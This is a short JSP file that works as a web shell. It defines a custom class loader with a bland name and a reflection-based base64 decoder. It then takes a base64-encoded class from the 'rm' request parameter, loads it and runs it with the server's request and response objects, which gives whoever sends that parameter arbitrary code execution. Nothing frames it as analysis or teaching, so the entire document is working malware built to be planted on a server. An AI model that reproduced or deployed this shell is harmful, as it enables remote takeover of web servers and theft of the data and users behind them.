
<%!
class CURSOR extends ClassLoader{
  CURSOR(ClassLoader c){super(c);}
  public Class raise(byte[] b){
    return super.defineClass(b, 0, b.length);
  }
}
public byte[] operation(String str) throws Exception {
  Class base64;
  byte[] value = null;
  try {
    base64=Class.forName("sun.misc.BASE64Decoder");
    Object decoder = base64.newInstance();
    value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] {String.class }).invoke(decoder, new Object[] { str });
  } catch (Exception e) {
    try {
      base64=Class.forName("java.util.Base64");
      Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
      value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { str });
    } catch (Exception ee) {}
  }
  return value;
}
%>
<%
String cls = request.getParameter("rm");
if (cls != null) {
  new CURSOR(this.getClass().getClassLoader()).raise(operation(cls)).newInstance().equals(new Object[]{request,response});
}
%>
